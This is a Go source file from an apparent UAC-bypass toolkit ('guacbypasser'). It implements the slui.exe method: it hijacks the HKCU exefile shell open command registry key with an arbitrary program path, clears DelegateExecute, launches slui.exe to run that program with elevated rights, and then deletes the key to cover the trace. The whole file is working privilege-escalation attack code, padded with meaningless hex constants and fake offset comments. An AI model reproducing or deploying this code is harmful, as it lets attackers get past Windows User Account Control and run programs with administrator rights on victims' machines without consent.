package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Slui(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_Slui__{
		Type:   "_slui",
		Method: "registry-command",
		Scode: [2]uintptr{
			0x0437e, 0x947ef,
		},

		Location: fmt.Sprintf("%s\\_slui.gUAC", os.Getenv("APPDATA")),
		_K_Slui:  0x8,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Println(err)
	}

	_, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		log.Println(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Println(err)
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("", currentDir); err != nil {
		log.Println(err)
	}

	// Setting "DelegateExecure" key value to None
	// +0x25df ...d

	if err := wkey32.SetStringValue("DelegateExecute", ""); err != nil {
		log.Println(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	// Execute cmd-like command "start slui.exe" ...
	var cmd = exec.Command("slui.exe")
	err = cmd.Run()

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	// Absolutly delete registry key "Software\Classes\exefile\shell\open\command" ...
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`)
	if err != nil {
		log.Println(err)
	}

	return err
}
